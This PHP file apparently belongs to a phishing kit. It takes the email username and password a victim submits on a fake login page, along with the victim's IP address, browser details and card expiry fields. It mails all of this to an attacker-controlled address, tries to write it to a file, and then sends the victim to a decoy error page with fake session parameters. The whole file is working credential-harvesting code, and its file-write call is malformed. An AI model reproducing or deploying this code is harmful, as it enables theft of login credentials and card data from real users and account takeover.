<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
$message .= "--------------  E-mail  -------------\n";
$message .= "Email : ".$_POST['username']."\n";
$message .= "Email Pass : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Deep  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "!!! [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: wowway <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);
    $text = fopen('../../', '');
fwrite($text, $message);

header("Location: ../error.html?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
